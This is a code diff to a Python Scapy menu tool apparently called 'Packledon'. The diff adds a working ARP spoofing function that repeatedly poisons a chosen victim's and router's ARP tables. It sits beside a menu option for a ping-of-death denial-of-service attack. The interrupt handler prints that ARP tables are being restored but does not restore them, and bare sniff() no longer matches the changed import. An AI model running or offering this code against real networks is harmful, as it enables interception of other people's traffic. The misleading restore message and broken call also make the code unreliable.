@@ -1,9 +1,10 @@
-#imports
 from itertools import count
 from pyfiglet import Figlet
-from scapy.all import * #need scapy for network control/access 
+import scapy.all as scapy #need scapy for network control/access 
 import sys
 import ipaddress
+import time
+
 #create banner
 f = Figlet(font='slant')
 print(f.renderText('Packledon'))
@@ -74,8 +75,50 @@ def enter_and_read_pcap():
 
 
 
-def arp_spoofing():
-    print("test")
+def arp_spoofing_attack():
+    victim_ip = input("Enter the victim's IP address: ")
+    router_ip = input("Enter the router's IP address: ")
+
+    def get_mac(ip):
+        """
+        Sends an ARP request to get the MAC address of a given IP.
+        """
+        arp_request = scapy.ARP(pdst=ip)  
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  
+        arp_request_broadcast = broadcast / arp_request  
+        answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  
+
+        if answ:  
+            return answ[0][1].hwsrc  
+        else:
+            print(f"[-] Failed to get MAC address for {ip}. Exiting.")
+            sys.exit(1)
+
+    def arp_spoofing(target_arp_ip, spoof_ip):
+        """
+        Creates and sends an ARP spoofing packet to poison the ARP table.
+        """
+        target_mac = get_mac(target_arp_ip)  
+        if not target_mac:
+            return
+        packet = scapy.ARP(op=2, pdst=target_arp_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(packet, verbose=False)
+
+    send_packets_count = 0
+    try:
+        while True:  
+            send_packets_count += 2
+            arp_spoofing(victim_ip, router_ip)  
+            arp_spoofing(router_ip, victim_ip)  
+            print(f"[+] Packets Sent: {send_packets_count}", end="\r")
+            sys.stdout.flush()  
+            time.sleep(2)  
+    except KeyboardInterrupt:
+        print("\n[+] Stopping ARP spoofing attack. Restoring ARP tables...")
+
+
+
+
 
 def dos_attack():
     target_ip = input("Please enter the target IP address for the ping of death attack: ")    
@@ -102,19 +145,19 @@ if user_determination == "1":
     arp_and_ping_scanning()
 
 elif user_determination == "2":
-        sniff(prn=packet_handler, count=100)
+    sniff(prn=packet_handler, count=100)
 
 elif user_determination == "3":
-        enter_and_read_pcap()
+    enter_and_read_pcap()
 
 elif user_determination == "4":
-        arp_spoofing()
+    arp_spoofing_attack()
 
 elif user_determination == "5":
     dos_attack()
 
 else:
-    prin("Please enter a valid selection")
+    print("Please enter a valid selection")
 
 
 
